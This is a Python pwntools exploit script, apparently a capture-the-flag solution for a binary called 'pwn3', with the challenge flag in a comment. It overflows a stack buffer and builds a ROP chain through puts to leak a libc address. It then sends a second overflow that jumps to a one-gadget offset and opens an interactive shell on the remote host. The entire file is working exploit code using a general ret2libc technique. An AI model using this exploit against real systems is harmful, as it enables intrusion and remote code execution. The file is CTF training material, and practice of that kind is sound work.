#!/usr/bin/env python
from pwn import *
import time

# EOF{Normal_BOF}

e , l = ELF('./pwn3') , ELF( 'libc-2.27.so' )

context.arch = 'amd64'
host , port = '10.140.0.8' , 11113
y = remote( host , port )

pop_rdi = 0x4006d3

p = flat(
    'a' * 0x10,
    pop_rdi,
    0x600ff0,
    e.plt['puts'],
    0x4005f7
)
y.send( p )

y.recvline()
l.address = u64( y.recv(6) + '\x00\x00' ) - l.sym.__libc_start_main
success( 'libc -> %s' % hex( l.address ) )

p = flat(
    'a' * 0x10,
    l.address + 0x10a38c
)

y.send( p )

y.interactive()